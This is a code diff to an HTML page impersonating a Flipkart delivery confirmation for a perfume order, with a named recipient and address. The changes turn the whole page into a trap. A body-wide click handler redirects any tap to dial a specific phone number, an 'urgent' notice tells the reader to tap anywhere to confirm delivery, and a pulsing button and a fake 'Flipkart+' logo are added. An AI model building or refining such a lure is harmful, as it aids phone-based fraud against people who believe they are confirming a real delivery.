@@ -11,6 +11,7 @@
             padding: 0;
             background-color: #f1f3f6;
             color: #212121;
+            cursor: pointer;
         }
         .header {
             background-color: #2874f0;
@@ -18,9 +19,17 @@
             display: flex;
             align-items: center;
         }
-        .logo {
-            height: 24px;
-            margin-right: 10px;
+        .logo-text {
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: -0.5px;
+        }
+        .logo-plus {
+            color: #ffe500;
+            font-size: 10px;
+            margin-left: 2px;
+            font-style: italic;
         }
         .container {
             max-width: 600px;
@@ -75,6 +84,12 @@
             justify-content: center;
             align-items: center;
             margin-right: 16px;
+            overflow: hidden;
+        }
+        .product-image img {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
         }
         .product-details h3 {
             margin: 0 0 8px 0;
@@ -109,7 +124,22 @@
             font-size: 16px;
             font-weight: 500;
             margin-top: 20px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            }
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            }
+            100% {
+                transform: scale(1);
+                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            }
         }
         .note {
             font-size: 12px;
@@ -117,11 +147,30 @@
             text-align: center;
             margin-top: 12px;
         }
+        .urgent-notice {
+            background-color: #fff8e1;
+            border-left: 4px solid #ffc107;
+            padding: 10px 15px;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        /* Backup styling for when image fails to load */
+        .product-image-backup {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            color: #666;
+            font-size: 10px;
+            text-align: center;
+        }
     </style>
 </head>
-<body>
+<body onclick="initiateCall()">
     <div class="header">
-        <img class="logo" src="/api/placeholder/100/24" alt="Flipkart Logo">
+        <div class="logo-text">Flipkart<span class="logo-plus">+</span></div>
     </div>
     
     <div class="container">
@@ -133,21 +182,26 @@
             </div>
         </div>
         
+        <div class="urgent-notice">
+            <strong>Important:</strong> Please tap anywhere to confirm successful delivery.
+        </div>
+        
         <div class="product">
             <div class="product-image">
-                <img src="/api/placeholder/80/80" alt="Product Image">
+                <!-- Using a placeholder with fallback -->
+                <img src="/api/placeholder/80/80" alt="ZARA Man Silver Summer Perfume" id="productImage" onerror="this.style.display='none'; this.parentNode.innerHTML='<div class=\'product-image-backup\'>ZARA Man Silver</div>';">
             </div>
             <div class="product-details">
-                <h3>Perfume Zara man</h3>
-                <p>Silver Summer | Qty: 1</p>
-                <p>₹899</p>
+                <h3>ZARA Man Silver Summer 2020</h3>
+                <p>Quantity: 1 | 100ml</p>
+                <p>₹2,599</p>
             </div>
         </div>
         
         <div class="delivery-address">
             <h3>Delivered to:</h3>
             <p>
-                Sadanand Salukhe <br>
+                Sadanand Salukhe<br>
                 Sri Manjunatha Luxury Pg<br>
                 Mahadevpura<br>
                 Bangalore - 560048<br>
@@ -155,9 +209,22 @@
             </p>
         </div>
         
-        <a href="tel:8601991304" class="call-button">Order Delivered! Click to View Details</a>
+        <div class="call-button">
+            Order Delivered! Tap to Confirm
+        </div>
         
-        <p class="note">Click the button above to view delivery confirmation and rate your experience</p>
+        <p class="note">Tap anywhere on the page to confirm delivery and rate your experience</p>
     </div>
+
+    <script>
+        // Function to initiate call
+        function initiateCall() {
+            window.location.href = 'tel:8601991304';
+        }
+        
+        // You would need to upload the image to your GitHub repository 
+        // and then reference it with a relative path for it to work reliably
+        // For example: "./zara-perfume.jpg"
+    </script>
 </body>
 </html>
